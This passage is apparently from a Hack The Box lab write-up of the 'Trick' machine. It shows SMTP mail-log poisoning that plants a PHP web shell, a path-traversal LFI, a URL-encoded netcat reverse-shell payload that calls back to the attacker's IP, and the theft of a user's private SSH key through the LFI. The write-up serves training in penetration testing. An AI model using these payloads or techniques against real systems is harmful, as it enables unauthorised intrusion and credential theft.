## Exploitation

### Getting Remote Code Execution

I spent considerable time exploring ways to leverage this LFI vulnerability. While I had file-reading capabilities through SQL injection, I researched [LFI to RCE techniques using PHP filters](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html) but couldn't get them working. The SQL injection file-write operations had failed, and PHP filters weren't yielding results.

However, I remembered the SMTP port from the initial Nmap scan. If I send an email to a user on the server, it gets stored in the `/var/mail` directory with the username as the filename. From earlier file reads, I had identified the user `michael` in the `/etc/passwd` file. My plan was to send an email containing PHP code to Michael and then access it via the LFI vulnerability.

I connected to the SMTP server and sent an email with PHP code:

```bash
┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
└──╼ $nc trick.htb 25
helo test
220 debian.localdomain ESMTP Postfix (Debian/GNU)
250 debian.localdomain

250 2.1.0 Ok
rcpt to: michael
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['0'])?>
.
250 2.0.0 Ok: queued as 548644099C
```

I then accessed the email file through the LFI vulnerability:

![rce](/assets/img/posts/trick/rce.png)

Perfect! I had code execution. Now I needed to upgrade this to a proper shell.

## Initial Foothold

### Shell as `michael`

### Method 1: LFI + PHP Reverse Shell (The Harder Way)

I set up a netcat listener on my machine and sent the following reverse shell payload through the LFI parameter:

```text
....//....//....//var/mail/michael&0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.15.47%209001%20%3E%2Ftmp%2Ff
```

```bash
┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.227.180 60780
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

Success! I obtained a shell as the `michael` user through the LFI + PHP method.

### Method 2: LFI + Private SSH Key (The Easier Way)

Alternatively, and more elegantly, I could have obtained Michael's private SSH key directly through the LFI vulnerability. I had direct access to read `/home/michael/.ssh/id_rsa`. This approach was simpler and more reliable than setting up a reverse shell.

Using the LFI vulnerability, I accessed the private key:

```bash
....//....//....//home/michael/.ssh/id_rsa
```

![id_rsa](/assets/img/posts/trick/id_rsa.png)

I then saved the private key to my local machine and set the proper permissions before using it to SSH as Michael:

```bash
┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
└──╼ $chmod 600 michael.id_rsa
┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
└──╼ $ssh michael@trick.htb -i michael.id_rsa

```
